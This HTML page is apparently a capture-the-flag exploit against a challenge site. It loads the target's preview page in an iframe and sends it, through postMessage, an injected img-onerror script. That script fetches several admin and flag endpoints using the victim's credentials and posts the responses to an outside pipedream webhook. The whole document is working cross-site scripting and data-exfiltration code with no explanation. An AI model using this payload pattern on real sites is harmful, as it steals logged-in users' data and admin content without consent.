<!doctype html>
<html>
    <body>
        <iframe
            id="f"
            src="https://5d12b108-0a0b-461f-a822-a31aff7b0b07.offsec.m0lecon.it/preview"
        ></iframe>
        <script>
            const WEBHOOK =
                "https://eorpvwpcvsuauqy.m.pipedream.net";
            const endpoints = [
              '/admin/api/flag',
              '/admin/flag',
              '/api/admin/flag',
              '/admin/api/messages',
            ];

            const payload = `<img src=x onerror="
              async function run() {
                const WEBHOOK = '${WEBHOOK}';
                
                const results = await Promise.all(
                  ${JSON.stringify(endpoints)}.map(async ep => {
                    const res = await fetch(ep, {credentials:'include'});
                    const text = await res.text();
                    return {ep, status: res.status, text};
                  })
                );
                
                await fetch(WEBHOOK, {
                  method: 'POST',
                  mode: 'no-cors',
                  keepalive: true,
                  body: JSON.stringify(results)
                });
              }
              run();
            ">`;
            document.getElementById("f").onload = () => {
                document
                    .getElementById("f")
                    .contentWindow.postMessage({ html: payload }, "*");
            };
        </script>
    </body>
</html>
